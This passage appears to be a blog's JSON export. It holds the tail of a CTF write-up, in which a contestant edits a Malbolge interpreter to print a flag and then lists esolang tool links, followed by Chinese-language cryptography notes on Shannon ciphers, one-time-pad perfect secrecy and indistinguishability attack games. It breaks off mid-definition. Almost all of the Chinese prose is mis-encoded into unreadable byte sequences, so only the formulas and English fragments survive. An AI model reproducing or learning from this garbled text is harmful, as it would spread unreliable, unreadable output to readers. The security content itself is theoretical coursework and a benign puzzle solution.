æœ‰ä¸€ä½å‚èµ›é€‰æ‰‹åˆ†äº«äº†ä¸€ä¸ªéå¸¸å·§å¦™çš„è§£æ³•ï¼Œå…·ä½“å¦‚ä¸‹ï¼šé¦–å…ˆä»–æ‰¾åˆ°äº†ä¸€ä¸ªç”¨ C è¯­è¨€ç¼–å†™çš„åŸå§‹ Malbolge è§£é‡Šå™¨ï¼ˆhttps://github.com/bipinu/malbolgeï¼‰ã€‚æ¥ç€ï¼Œä»–å°†ç¬¬ 131 è¡Œçš„return æ”¹ä¸º breakï¼Œä»¥é¿å… exec() å‡½æ•°æå‰ç»“æŸã€‚æœ€åï¼Œä»–ä½¿ç”¨ä¿®æ”¹åçš„è§£é‡Šå™¨è¿è¡Œé¢˜ç›®ä¸­æä¾›çš„ Malbolge ä»£ç ï¼ŒæˆåŠŸå¾—åˆ°äº† flagã€‚ å·¥å…·ï¼ˆç½‘ç«™ï¼‰æœ€åé™„ä¸Šä¸€äº›ç½‘é¡µï¼Œå¯ä»¥ç”¨æ¥ç”Ÿæˆï¼Œç¼–è¯‘ï¼Œæˆ–è€…debugã€‚ https://lutter.cc/malbolge/debugger.html https://zb3.me/malbolge-tools/#generator https://tio.run/##y03MScrPSU/9/19DXU3VyjJWsa62psoorKK8TFcnwL@wID8vR8UjKzMjrcbJwcFOx9bG18pSzTxSOSzMKCQ4T88/VSvZWsNTTVVFWSnX2cnRvqqiokwrIMkioTDfxCg3yk2v2rNSyyHFRd3GOt5eMaYWYnpwcOD//wA","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Misc","slug":"CTF/Misc","permalink":"https://archer-baiyi.github.io/categories/CTF/Misc/"}],"tags":[{"name":"Misc","slug":"Misc","permalink":"https://archer-baiyi.github.io/tags/Misc/"},{"name":"esolang","slug":"esolang","permalink":"https://archer-baiyi.github.io/tags/esolang/"},{"name":"Malbolge","slug":"Malbolge","permalink":"https://archer-baiyi.github.io/tags/Malbolge/"}]},{"title":"å¯†ç å­¦ Kryptografie","slug":"TUM info ç¬”è®°/å¯†ç å­¦/å¯†ç å­¦åŸºç¡€","date":"2025-04-24T19:45:04.000Z","updated":"2025-05-04T15:00:06.518Z","comments":true,"path":"2025/04/24/TUM info ç¬”è®°/å¯†ç å­¦/å¯†ç å­¦åŸºç¡€/","permalink":"https://archer-baiyi.github.io/2025/04/24/TUM%20info%20%E7%AC%94%E8%AE%B0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/","excerpt":"å¯†ç å­¦ç›¸å…³ç¬”è®°","text":"Basicsæˆ‘ä»¬é¦–å…ˆæ¥çœ‹ä¸€ä¸‹Shannonæ˜¯å¦‚ä½•å®šä¹‰åŠ å¯†çš„ï¼š Schannon cipher æ˜¯ä¸€ä¸ªåŠ å¯†æ–¹æ¡ˆï¼ˆencryption schemeï¼‰$\\Pi := (E,D)$ ï¼Œä½œç”¨äº$(\\mathcal{K},\\mathcal{M},\\mathcal{C})$ä¸Šï¼Œå…¶ä¸­ï¼š $\\mathcal{K}$ æ˜¯ä¸€ä¸ªæœ‰é™çš„åŠ å¯†å¯†é’¥é›†åˆã€‚ $\\mathcal{M}$ æ˜¯ä¸€ä¸ªæœ‰é™çš„æ¶ˆæ¯é›†åˆã€‚ $\\mathcal{C}$ æ˜¯ä¸€ä¸ªæœ‰é™çš„å¯†æ–‡é›†åˆã€‚ $E: \\mathcal{K} \\times \\mathcal{M} \\to \\mathcal{C}$ æ˜¯åŠ å¯†å‡½æ•°ã€‚ $D: \\mathcal{K} \\times \\mathcal{C} \\to \\mathcal{M}$ æ˜¯è§£å¯†å‡½æ•°ã€‚ å¹¶ä¸”æ»¡è¶³Correctness propertyï¼š$\\forall k \\in \\mathcal{K},\\ m \\in \\mathcal{M} :\\ D(k, E(k, m)) = m$ã€‚ æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªå¾ˆç®€å•çš„ä¾‹å­ï¼šOne-time-pad (OTP)ã€‚ $\\mathcal{K} = \\mathcal{M} = \\mathcal{C} := \\{0,1\\}^L$ with $L$ as a fixed length $\\geq 1$. $E(k, m) := k \\oplus m$ $D(k, c) := k \\oplus c$ ï¼ˆè¿™é‡Œçš„$\\oplus$è¡¨ç¤ºçš„æ˜¯xorè¿ç®—ã€‚ï¼‰ æ³¨æ„åˆ°ï¼š D(k, E(k, m)) = D(k, k \\oplus m) = k \\oplus (k \\oplus m) = (k \\oplus k) \\oplus m = 0^L \\oplus m = mæ‰€ä»¥OPTæ˜¯ä¸€ä¸ªSchannon cipherã€‚ Definition 1: (Perfect Ciphertext Indistinguishability / perfect secrecy / perfect security)ä¸€ä¸ªå®šä¹‰åœ¨ $(\\mathcal{K}, \\mathcal{M}, \\mathcal{C})$ ä¸Šçš„ Shannon cipher $\\Pi = (E, D)$ï¼Œæ»¡è¶³å¯†æ–‡å®Œå…¨ä¸å¯åŒºåˆ†ï¼ˆhas perfectly indistinguishable ciphertextsï¼‰ï¼ˆæˆ–è€…è¯´æ˜¯ç»å¯¹å®‰å…¨ perfectly secureçš„ï¼‰ï¼Œå½“\\forall m_0, m_1 \\in \\mathcal{M},\\ c \\in \\mathcal{C} :\\ \\Pr[E(k, m_0) = c] = \\Pr[E(k, m_1) = c].å…¶ä¸­æ¦‚ç‡æ˜¯é’ˆå¯¹å¯†é’¥çš„åˆ†å¸ƒè€Œè¨€ï¼Œ$k$ æ˜¯ä¸€ä¸ªéšæœºå˜é‡ã€‚ æˆ‘ä»¬ä¼šå‡è®¾æ¯ä¸ªå¯†é’¥ $k$ éƒ½æ˜¯ä» $\\mathcal{K}$ é‡ŒuniformlyæŒ‘é€‰çš„ï¼Œå³æ¯ä¸ªå¯†é’¥è¢«æŒ‘é€‰çš„æ¦‚ç‡éƒ½ç­‰äº $\\frac{1}{\\mathcal{K}}$ã€‚ è®¾ N_{m, c} = \\left| \\left\\{ k \\in \\mathcal{K} : E(k, m) = c \\right\\} \\right|ä¸ºå¯ä»¥å°†måŠ å¯†æˆcçš„å¯†é’¥æ•°é‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°†å®šä¹‰é‡Œçš„ç­‰å¼é‡æ–°é‡æ–°è¡¨è¿°ä¸ºï¼š \\forall m_0, m_1 \\in \\mathcal{M},\\ c \\in \\mathcal{C} :\\ N_{m_0, c} = N_{m_1, c}ä¹Ÿå°±æ˜¯è¯´å¯¹äºä»»æ„2ä¸ªæ˜æ–‡å’Œ1ä¸ªå¯†æ–‡ï¼Œéƒ½å­˜åœ¨åŒæ ·å¤šçš„å¯†é’¥å¯ä»¥å°†è¿™ä¸¤æ®µå¯†æ–‡éƒ½åŠ å¯†æˆè¿™æ®µå¯†æ–‡ã€‚ Theorem 1:The one-time pad (OTP) is perfectly secure. è¯æ˜ï¼š Given an OTP, for all $m \\in \\mathcal{M}$ there is exactly one unique $k \\in \\mathcal{K}$ such that $E(k, m) = c$. It follows that $N_{m,c} = 1$ï¼Œå› ä¸º å­˜åœ¨ï¼šThere is at least one key $k := c \\oplus m$ with $E(c \\oplus m, m) = c \\oplus m \\oplus m = c$. å”¯ä¸€ï¼šAssuming two keys $k_0, k_1 \\in \\mathcal{K}$ exist where $E(k_0, m) = E(k_1, m) = c$: \\begin{aligned} E(k_0, m) &= E(k_1, m) \\\\ k_0 \\oplus m &= k_1 \\oplus m \\\\ k_0 \\oplus m \\oplus m &= k_1 \\oplus m \\oplus m \\\\ k_0 &= k_1 \\end{aligned}æ‰€ä»¥æœ‰ï¼š \\forall m_0, m_1 \\in \\mathcal{M}, c \\in \\mathcal{C} : N_{m_0, c} = N_{m_1, c}=1. $\\square$ Theorem 2: å¦‚æœ$\\Pi = (E, D)$æ˜¯ç»å¯¹å®‰å…¨çš„ï¼ˆperfectly secureï¼‰ï¼Œé‚£ä¹ˆæœ‰ $|\\mathcal{K}| \\geq |\\mathcal{M}|$ã€‚ è¯æ˜ï¼š æˆ‘ä»¬å‡è®¾ $|\\mathcal{K}| &lt; |\\mathcal{M}|$ï¼Œå¹¶ä»»æ„é€‰æ‹©ä¸€æ®µæ˜æ–‡$m_0$å’Œä¸€ä¸ªå¯†é’¥$kâ€™$ã€‚è®¾$c := E(kâ€™,m_0)$ï¼Œé‚£ä¹ˆæœ‰ Pr[E(k,m_0)=c] > 0è®¾ S = \\{ D(\\hat{k},c) \\in \\mathcal{M}: \\hat{k} \\in \\mathcal{K} \\}ä¸ºcæ‰€æœ‰å¯èƒ½çš„è§£å¯†ç»“æœã€‚é€‰æ‹©$m_1\\in \\mathcal{M}\\backslash S$ ï¼ˆè¿™ä¸ªé›†åˆéç©ºæ˜¯å› ä¸º $|S| \\leq |\\mathcal{K}| &lt; |\\mathcal{M}|$ï¼‰ï¼Œé‚£ä¹ˆå°±æœ‰ 0 < \\Pr[E(k, m_0) = c] \\ne \\Pr[E(k, m_1) = c] = 0a contradiction. $\\square$ è¯¥å¦‚ä½•ç†è§£è¿™ä¸ªå®šç†å‘¢ï¼Ÿ å…¶ä¸»è¦è¯´æ˜çš„å°±æ˜¯å½“å¯†é’¥ç©ºé—´å°äºä¿¡æ¯ç©ºé—´æ—¶ï¼Œå¯èƒ½ä¼šå¯¹äºæœ‰äº›å¯†æ–‡åªå­˜åœ¨ä¸€ä¸ªï¼ˆå¯èƒ½çš„ï¼‰å¯¹åº”çš„æ˜æ–‡ã€‚ ç„¶è€Œåœ¨å®é™…æƒ…å†µé‡Œï¼Œä¸€ç›´è¦æ±‚å¯†é’¥ç©ºé—´å¤§äºä¿¡æ¯ç©ºé—´å…¶å®ä¸å¤ªç°å®ï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦å„æ–¹å„é¢éƒ½ä¼ è¾“å¤§é‡çš„ä¿¡æ¯ã€‚è¿™å°±å¯¼è‡´Shannonæå‡ºæ¥çš„è¿™ä¸ªperfect secrecyæ¦‚å¿µä¸å¤Ÿå®ç”¨ï¼ˆpracticalï¼‰ã€‚ å…¶æ ¹æœ¬çš„åŸå› æ˜¯ï¼Œshannonæå‡ºæ¥çš„æ¦‚å¿µç€é‡äºæœç»æ‰€æœ‰æ½œåœ¨çš„å¨èƒã€‚ä½†å®é™…ä¸Šå¯¹æˆ‘ä»¬æ¥è¯´ï¼Œæœ‰äº›å¨èƒæ˜¯å¯ä»¥æ¥å—çš„ï¼šæ¯”å¦‚è¯´è´¨å› æ•°åˆ†è§£å¾ˆå¤§çš„æ•°éœ€è¦å¤§é‡çš„è®¡ç®—èµ„æºä¸æ—¶é—´ï¼Œå¯¹æˆ‘ä»¬å¾ˆéš¾é€ æˆä»€ä¹ˆå®è´¨æ€§çš„å¨èƒã€‚åˆæˆ–è€…æ˜¯æˆ‘è¿æ°”å¤Ÿå¥½ï¼Œå¯ä»¥ä¸€ä¸‹å­çŒœåˆ°å¯†ç ã€‚ æ‰€ä»¥è¯´æˆ‘ä»¬å®é™…è¿½æ±‚çš„æ˜¯æ— æ³•ä»¥ä¸å¯å¿½ç•¥çš„ï¼ˆnon-negligibleï¼‰æ¦‚ç‡è¢«é«˜æ•ˆï¼ˆefficientlyï¼‰ç ´è§£çš„é«˜æ•ˆåŠ å¯†ç®—æ³•ï¼Œã€‚ What we would like to have are efficient encryption schemes that cannot be broken â€œefficientlyâ€ with a â€œnon-negligibleâ€ probability. æ¯”å¦‚è¯´è´¨å› æ•°åˆ†è§£ï¼Œå®ƒçš„ç†è®ºæˆåŠŸæ¦‚ç‡å¾ˆé«˜ï¼Œä½†æ˜¯æ•ˆç‡éå¸¸ä½ï¼Œæ‰€ä»¥å¯ä»¥è¢«å¿½è§†ã€‚è€ŒçŒœå¯†ç è¿™ç§æ–¹æ³•çš„æˆåŠŸæ¦‚ç‡å¤ªä½äº†ï¼Œæ‰€ä»¥ä¹Ÿä¸éœ€è¦ç†ä¼šã€‚ é‡æ–°è¡¨è¿°ä¸€ä¸‹å°±æ˜¯ï¼šâ€œä¸å­˜åœ¨ä¸€ä¸ªç®—æ³•å¯ä»¥åœ¨æ—¶é—´Tå†…ä»¥pçš„æ¦‚ç‡æˆåŠŸç ´è§£æˆ‘ä»¬çš„åŠ å¯†ç®—æ³•â€ã€‚ Definition 2 (Polynomially-bounded):A function $f : \\mathbb{Z}_+ \\to \\mathbb{R}$ is called polynomially-bounded if there exist $c, n_0 \\in \\mathbb{N}$ such that for all integers $n \\geq n_0$, we have |f(n)| \\leq n^c \\quad (f(n) \\in \\mathcal{O}(n^c)). Definition 3 (PPT algorithm):An algorithm is called efficient, if its runtime as a function of its input length is polynomially-bounded. We call this algorithm a probabilistic polynomial time (PPT) algorithm. å°±å…¶å®efficientå’ŒPPTæ˜¯ä¸€ä¸ªæ„æ€ã€‚ Definition 4 (Efficiently sampleable):A set $S$ is efficiently sampleable if there is a PPT-algorithm that is able to sample an element from it uniformly and randomly.For such a sampling, we use the notation $s \\xleftarrow{R} S$. Definition 5 (Negligible):A function f: \\mathbb{Z}_+ \\to \\mathbb{R}is called negligible if \\forall c \\in \\mathbb{N} \\ \\exists n_0 \\in \\mathbb{Z}_+ \\ \\text{ s.t. for all integers } n \\geq n_0 :|f(n)| \\leq \\frac{1}{n^c} \\quad \\left(f(n) \\in \\mathcal{O}\\left(\\frac{1}{n^c}\\right)\\right). $f$çš„å€¼ä¼šæ— é™å°ã€‚ ä¾‹å­ï¼š$\\frac{1}{2^n},\\quad \\frac{1}{n^{\\log n}}$ï¼Œthe probability of randomly choosing a specific key from a set of $2^n$ $n$-bit keys Definition 6 (Super-poly):A function $f : \\mathbb{Z}_+ \\to \\mathbb{R}$ is called super-poly if $\\frac{1}{f}$ is negligible. ç¿»è¯‘ä¸€ä¸‹ï¼š å¯¹äºæ‰€æœ‰çš„ $c \\in \\mathbb{N}$ éƒ½å­˜åœ¨ä¸€ä¸ª $n_0 \\in \\mathbb{Z}_+$ä½¿å¾— for all integers $n \\geq n_0$, we have ï¼š \\begin{align*} |\\frac{1}{f(n)}| &\\leq \\frac{1}{n^c} \\\\ \\Leftrightarrow f(n) &\\geq n^c \\end{align*}ä¾‹å­ï¼šThe runtime of an algorithm enumerating all $n$-bit keys to possible ciphertexts for a message $m$ by calculating $E(k, m)$ for all $2^n$ keys is super-poly. Let $c \\in \\mathbb{R}_+$ be a constant, f_{neg}, g_{neg}be negligible functions, f_{poly}, g_{poly}be polynomially-bounded functions, and f_{spoly}, g_{spoly}be super-polynomial functions. Then: é€šå¸¸æˆ‘ä»¬ä¼šå®šä¹‰2ä¸ªå‚æ•°ï¼š Security parameter $\\lambda$: A positive integer. System parameter $\\Lambda$: A bit string. $\\lambda$ is chosen when a cipher is deployed. ä¸€èˆ¬æ¥è¯´ï¼Œ$\\lambda$ çš„å€¼è¶Šå¤§ï¼Œå¯†ç ç³»ç»Ÿçš„å®‰å…¨ç­‰çº§è¶Šé«˜ã€‚è¾ƒé«˜çš„å€¼é€šå¸¸ä¸è¾ƒé•¿çš„å¯†é’¥ç›¸å…³è”ï¼ŒåŒæ—¶å¯¹åŠ è§£å¯†æ“ä½œ $D$ å’Œ $E$ çš„æ€§èƒ½å¸¦æ¥è´Ÿé¢å½±å“ã€‚ è€Œ$\\Lambda$ is not chosen but determined by $\\lambda$ for a specific cipher. æ¯”å¦‚è¯´ï¼Œ$\\lambda$å¯èƒ½è¡¨ç¤ºæ¨¡æ•° $n$ çš„ä½é•¿åº¦ï¼ˆlength in bitsï¼‰ï¼Œ$n$æœ¬èº«åˆ™ä¸ºæˆä¸ºSystem parameter$\\Lambda$ã€‚ è¿™ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯å…¬å¼€çš„ã€‚ The parameterization applies the key, message and ciphertext spaces \\{\\mathcal{K}_{\\lambda, \\Lambda}\\}_{\\lambda, \\Lambda},\\quad \\{\\mathcal{M}_{\\lambda, \\Lambda}\\}_{\\lambda, \\Lambda},\\quad \\{\\mathcal{C}_{\\lambda, \\Lambda}\\}_{\\lambda, \\Lambda} Definition 7 (efficient algorithm):Let $A$ be an algorithm that takes as input a security parameter $\\lambda \\in \\mathbb{Z}_{\\geq 1}$, as well as other parameters encoded as a bit string $x \\in \\{0,1\\}^{\\leq p(\\lambda)}$ for some fixed polynomial $p$.We call $A$ an efficient algorithm if there exist a poly-bounded function $t$ and a negligible function $\\epsilon$such that for all $\\lambda$ and $x$, the probability that the running time of $A$ on input $(\\lambda, x)$ exceeds $t(\\lambda)$ is at most $\\epsilon(\\lambda)$. ç¿»è¯‘ä¸€ä¸‹ï¼šAçš„è¾“å…¥ä¸ºä¸€ä¸ª security parameter $\\lambda \\in \\mathbb{Z}_{\\geq 1}$, ä»¥åŠè¢« encoded as a bit string $x \\in \\{0,1\\}^{\\leq p(\\lambda)}$ ï¼ˆfor some fixed polynomial $p$ï¼‰çš„å…¶ä»–çš„parametersã€‚ Definition 8 (computational cipher):A computational cipher is a pair of efficient algorithms $\\Pi := (E,D)$ such that:$k \\in \\mathcal{K}$ is an encryption key.$m \\in \\mathcal{M}$ is a message.$c \\in \\mathcal{C}$ is a ciphertext.$E : \\mathcal{K} \\times \\mathcal{M} \\rightarrow \\mathcal{C}$ is the encryption algorithm.$D : \\mathcal{K} \\times \\mathcal{C} \\rightarrow \\mathcal{M}$ is the decryption algorithm.$\\mathcal{K}, \\mathcal{M}$ and $\\mathcal{C}$ are finite spaces. computational cipherçš„å®šä¹‰å…¶å®å’ŒShannon cipherå°±åªå·®äº†ä¸€ä¸ª efficient algorithms çš„æ¡ä»¶ã€‚ å½“ç„¶åœ¨ç°å®ç”Ÿæ´»ä¸­ï¼Œä¼ è¾“æ•°æ®æ—¶ä¼šäº§ç”Ÿå„ç§éšæœºçš„å™ªéŸ³ï¼Œæ‰€ä»¥$E$ å¯ä»¥æ˜¯ non-deterministicã€‚åœ¨è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬ä¼šå¼•å…¥ä¸€ä¸ªæ–°çš„å‚æ•°randomnessï¼š$r \\in \\mathcal{R}$ ï¼Œå¹¶ä¸”ç”¨ c \\xleftarrow{R} E(k, m) \\quad\\text{ or }\\quad r \\xleftarrow{R} \\mathcal{R} \\quad\\text{ or }\\quad c \\leftarrow E(k, m; r)è¡¨ç¤ºï¼ˆå—éšæœºæ•°çš„å½±å“çš„ï¼‰åŠ å¯†åçš„ç»“æœã€‚ ï¼ˆè¿™é‡Œç®­å¤´ä¸Šçš„$R$å°±åªæ˜¯è¡¨é¢å½“å‰è€ƒè™‘çš„æ˜¯å—éšæœºæ•°çš„å½±å“çš„åŠ å¯†ï¼‰ è€Œcorrectness requirementä¹Ÿéœ€è¦éšä¹‹æ”¹å†™æˆï¼š \\forall c \\xleftarrow{R} E(k, m) : D(k, c) = mï¼ˆå³å°±ç®—å—éšæœºæ•°çš„å½±å“ï¼Œä¹Ÿéœ€è¦å¯ä»¥æˆåŠŸè§£å¯†å‡ºæ¥ã€‚æ„Ÿè§‰è·Ÿcoding theoryå¾ˆåƒã€‚ï¼‰ å½“$E$ æ˜¯ deterministic çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¼šæŠŠ$\\Pi = (E,D)$ å«ä½œ deterministic cipherã€‚ï¼ˆæ¯”å¦‚è¯´OTPï¼‰ ä¸€ä¸ªdeterministic cipheræ˜¾ç„¶æ˜¯Shannon cipherã€‚ ä¹‹å‰æˆ‘ä»¬å®šä¹‰çš„ Perfect Ciphertext Indistinguishability æ˜¯è¿™æ ·çš„ï¼š \\forall m_0, m_1 \\in \\mathcal{M},\\ c \\in \\mathcal{C} :\\ \\Pr[E(k, m_0) = c] = \\Pr[E(k, m_1) = c].è€Œæˆ‘ä»¬å¸Œæœ›å°†è¿™ä¸ªå®šä¹‰æ¨å¹¿åˆ°å¯ä»¥é€‚åº”æ‰€æœ‰çš„ predicate $\\phi$ï¼ˆä¸€ä¸ªåˆ¤æ–­å‡½æ•°ï¼Œè¾“å‡ºç»“æœåªä¸ºtrueæˆ–è€…falseã€‚ä¹Ÿå°±æ˜¯ä¸€ä¸ªä»$\\mathcal{C}$ æ˜ å°„åˆ°$\\{0,1\\}$çš„å‡½æ•°ã€‚æ¯”å¦‚è¯´åˆ¤æ–­â€œå¯†æ–‡çš„å‰4ä½æ˜¯å¦å…¨ä¸º0â€ã€‚ï¼‰ï¼š \\forall \\phi \\in \\{0,1\\}^{\\mathcal{C}},\\ m_0, m_1 \\in \\mathcal{M}:\\ \\Pr[\\phi(E(k, m_0))] = \\Pr[\\phi(E(k, m_1))]ç»™è¿™ä¸ªå¼å­å¼•å…¥ä¸€ä¸ªè¯¯å·®ï¼ˆa negligible chance for an adversary to break our scheme by demandingï¼‰å°±ä¼šå˜æˆï¼š \\forall \\phi \\in \\{0,1\\}^{\\mathcal{C}},\\ m_0, m_1 \\in \\mathcal{M}:\\ |\\Pr[\\phi(E(k, m_0))] - \\Pr[\\phi(E(k, m_1))]| \\leq \\epsilonè¿™ä¸ªä¾¿æ˜¯Statistical Ciphertext Indistinguishabilityçš„å®šä¹‰ã€‚ è€Œæ‰€è°“çš„Computational Ciphertext Indistinguishabilityä¾¿æ˜¯åœ¨æ­¤åŸºç¡€ä¸Šç»§ç»­è¦æ±‚ predicate $\\phi$ æ˜¯efficientã€‚ Attack Gameæˆ‘ä»¬é€šå¸¸ä¼šç”¨ä¸€ä¸ªAttack Gameæ¥å½¢å¼åŒ–å®šä¹‰å®‰å…¨æ€§ã€‚ä¼šæœ‰ä¸€ä¸ªAdversary $\\mathcal{A}$ï¼Œå¦‚æœä»–çš„è¾“å‡ºä¸åŒäºä»»ä½•â€trivial attackâ€ï¼ˆæ¯”å¦‚è¯´éšæœºçŒœæµ‹ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¯´ä»–ç ´è§£ï¼ˆbreakï¼‰äº†æˆ‘ä»¬çš„åŠ å¯†ã€‚æˆ‘ä»¬ä¼šç”¨$\\mathcal{A}$â€™s advantage æ¥è¡¡é‡ä»–å¯¹æˆ‘ä»¬çš„åŠ å¯†æœ‰å¤šå¤§çš„å½±å“ã€‚ Attack Game 1 (Ciphertext Indistinguishability):For a given cipher $\\Pi = (E, D)$ defined over $(\\mathcal{K}, \\mathcal{M}, \\mathcal{C})$ and for a given adversary $\\mathcal{A}$, we define two experiments.For $b \\in \\{0,1\\}$, Experiment $b$ proceeds as follows:The adversary computes $m_0, m_1 \\in \\mathcal{M}$ of the same length and sends them to a challenger.The challenger computes k \\xleftarrow{R} \\mathcal{K},c \\xleftarrow{R} E(k, m_b)and sends $c$ to the adversary.The adversary outputs a bit $\\hat{b} \\in \\{0,1\\}$.Let $W_b$ be the event that $\\mathcal{A}$ outputs 1.ï¼ˆ$\\mathcal{A}$åœ¨å®éªŒbçš„æ—¶å€™è¾“å‡º1ï¼‰ å›¾ç¤ºï¼š Definition:We define $\\mathcal{A}$â€™s ciphertext distinguishing advantage or semantic security advantage asSCadv[\\mathcal{A}, \\Pi] := |\\Pr[W_0] - \\Pr[W_1]| Definition 9 (Ciphertext Indistinguishability):A cipher $\\Pi := (E, D)$ has (computationally) indistinguishable ciphertexts,if $SC_{adv}[\\mathcal{A}, \\Pi]$ is negligible for all PPT adversaries $\\mathcal{A}$. å¦‚æœå¯¹äºæ‰€æœ‰adversaries $\\mathcal{A}$éƒ½æœ‰ï¼š SC_{adv}[\\mathcal{A}, \\Pi] = 0é‚£ä¹ˆå®ƒä¸€å®šæ˜¯(computationally) indistinguishable ciphertextsã€‚ ä¾‹å­ï¼š Trivial attacks å¦‚æœ$\\mathcal{A}$æ°¸è¿œè¾“å‡º1ï¼Œé‚£ä¹ˆ SCadv[\\mathcal{A}, \\Pi] := |\\Pr[W_0] - \\Pr[W_1]| = |1-1| = 0 å¦‚æœ$\\mathcal{A}$é€šè¿‡æ‰”ç¡¬å¸é€‰æ‹©è¾“å‡ºï¼Œé‚£ä¹ˆ SCadv[\\mathcal{A}, \\Pi] := |\\Pr[W_0] - \\Pr[W_1]| = |\\frac{1}{2} - \\frac{1}{2}| = 0 å¦‚æœæŒ‘é€‰2æ¡ä¸€æ ·çš„æ˜æ–‡ï¼Œé‚£ä¹ˆadvantageä¹Ÿç­‰äº0ï¼Œå› ä¸ºä¸å¯èƒ½é€šè¿‡ä»»ä½•æ‰‹æ®µå¯ä»¥åˆ¤æ–­å‡ºæ¥åˆ°åº•åŠ å¯†çš„æ˜¯å“ªæ¡ä¿¡æ¯ï¼Œæ‰€ä»¥åªèƒ½çŒœï¼Œä¹Ÿå°±æ˜¯$|\\frac{1}{2} - \\frac{1}{2}| = 0$ã€‚ å‡å¦‚è¿™æ ·è®¾è®¡ä¸€ä¸ªåŠ å¯†ï¼š$E(k, m) := (\\text{parity}(m), Eâ€™(k, m))$ï¼Œå³åŠ å¯†ç»“æœåŒ…å«2ä¸ªä¿¡æ¯ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ˜æ–‡$m$çš„å¥‡å¶æ€§ï¼Œç¬¬äºŒä¸ªæ˜¯çœŸæ­£çš„åŠ å¯†å†…å®¹ï¼Œé‚£ä¹ˆå°±ä¼šå­˜åœ¨ä¸€ä¸ª adversary with advantage 1ï¼š $\\mathcal{A}$æŒ‘é€‰2ä¸ªæ˜æ–‡ï¼Œä¸€ä¸ªçš„parityç­‰äº1ï¼Œä¸€ä¸ªçš„ç­‰äº0.é‚£ä¹ˆä»–å°±å¯ä»¥é€šè¿‡$E(k, m)$çš„ç¬¬ä¸€ä¸ªcomponentçš„å€¼ï¼ˆparityï¼‰æ¥åˆ¤æ–­æ˜æ–‡åˆ°åº•æ˜¯é‚£æ¡ã€‚ å¯¹äºperfectly secure ciphersï¼Œæ‰€æœ‰çš„adversary has advantage 0 ã€‚ å¦‚æœæˆ‘ä»¬è®©challengeréšæœºæŒ‘é€‰bï¼Œé‚£ä¹ˆå°±ä¼šå¾—åˆ°ä¸‹é¢è¿™ç§attack gameï¼š Attack Game 2 (Ciphertext Indistinguishability â€” bit guessing) :For a given cipher $\\Pi = (E, D)$ defined over $(\\mathcal{K}, \\mathcal{M}, \\mathcal{C})$ and for a given adversary $\\mathcal{A}$, the experiment proceeds as follows:The adversary computes $m_0, m_1 \\in \\mathcal{M}$ of the same length and sends them to a challenger.The challenger computes $b \\xleftarrow{R} \\{0,1\\}$, $k \\xleftarrow{R} \\mathcal{K}$, $c \\xleftarrow{R} E(k, m_b)$The adversary outputs a bit $\\hat{b} \\in \\{0,1\\}$Let $W$ be the event that $\\hat{b} = b$ å›¾ç¤ºï¼š Definition:We define $\\mathcal{A}$â€™s bit-guessing advantage as:SCadv^*[\\mathcal{A}, \\Pi] := |\\Pr[W] - \\tfrac{1}{2}| Lemma:SCadv^*[\\mathcal{A}] = \\frac{1}{2}SCadv[\\mathcal{A}] è¯æ˜ï¼š å› ä¸ºbæ˜¯éšæœºæŒ‘é€‰çš„ï¼Œæ‰€ä»¥ \\text{Pr}[b = 0] = \\text{Pr}[b = 1] = \\frac{1}{2}é‚£ä¹ˆæœ‰ \\begin{align*} \\text{Pr}[W] &= \\text{Pr}[\\hat{b} = b] \\\\ &= \\text{Pr}[\\hat{b} = b \\mid b = 0] \\cdot \\text{Pr}[b = 0] + \\text{Pr}[\\hat{b} = b \\mid b = 1] \\cdot \\text{Pr}[b = 1] \\\\ &= \\frac{1}{2} \\cdot \\left( \\text{Pr}[\\hat{b} = 0 \\mid b = 0] + \\text{Pr}[\\hat{b} = 1 \\mid b = 1] \\right) \\end{align*}æ ¹æ®ä¹‹å‰$W_0,W_1$çš„å®šä¹‰å¯ä»¥å¾—åˆ°ï¼š \\text{Pr}[\\hat{b} = 0 \\mid b = 0] = 1 - \\text{Pr}[\\hat{b} = 1 \\mid b = 0] = 1 - \\text{Pr}[W_0] \\text{Pr}[\\hat{b} = 1 \\mid b = 1] = \\text{Pr}[W_1]æ‰€ä»¥ï¼š \\begin{align*} SCadv^*[\\mathcal{A}, \\Pi] &= \\left| \\text{Pr}[W] - \\frac{1}{2} \\right| \\\\ &= \\left| \\frac{1}{2} \\cdot (1 - \\text{Pr}[W_0] + \\text{Pr}[W_1]) - \\frac{1}{2} \\right| \\\\ &= \\frac{1}{2} \\cdot \\left| \\text{Pr}[W_1] - \\text{Pr}[W_0] \\right| \\\\ &= \\frac{1}{2} \\cdot SCadv[\\mathcal{A}, \\Pi] \\end{align*}. $\\square$ Theorem 3:The one-time pad ï¼ˆOTPï¼‰ has indistinguishable ciphertexts. è¯æ˜ï¼š æˆ‘ä»¬ç”¨bit-guessing gameæ¥è¯æ˜è¿™ä¸ªthmã€‚ Let $\\mathcal{A}$ be any adversary. Assume it outputs messages $m_0, m_1 \\in \\{0,1\\}^L$ for some length $L$. Since $k$ is randomly chosen, $m_b \\oplus k$ is a uniformly random bitstring of length $L$, independent of $b$. æ‰€ä»¥è¯´åªèƒ½éšæœºçŒœæµ‹bã€‚ æ‰€ä»¥ SCadv^*[\\mathcal{A}, \\Pi_{\\text{OTP}}] = | \\text{Pr}[W] - \\frac{1}{2} | =| \\text{Pr}[b = \\hat{b}] - \\frac{1}{2} |= 0.$\\square$ Secret key cryptographyDefinition 10 (Pseudo-random generator):A pseudo-random generator (PRG) is an efficiently computable function G : \\mathcal{S} \\to \\mathcal{R}where:$|\\mathcal{S}| &lt; |\\mathcal{R}|$$\\mathcal{S}$ (usually $\\{0,1\\}^l$) is called the seed space.$\\mathcal{R}$ (usually $\\{0,1\\}^L$, $L &gt; l$) is called the output space. æˆ‘ä»¬å¯ä»¥ç»§ç»­å“Ÿä¸ªattack gameæ¥formalize â€œrandomâ€çš„æ¦‚å¿µã€‚ Attack Game 3 (PRG advantage):For a given PRG $G$ defined over 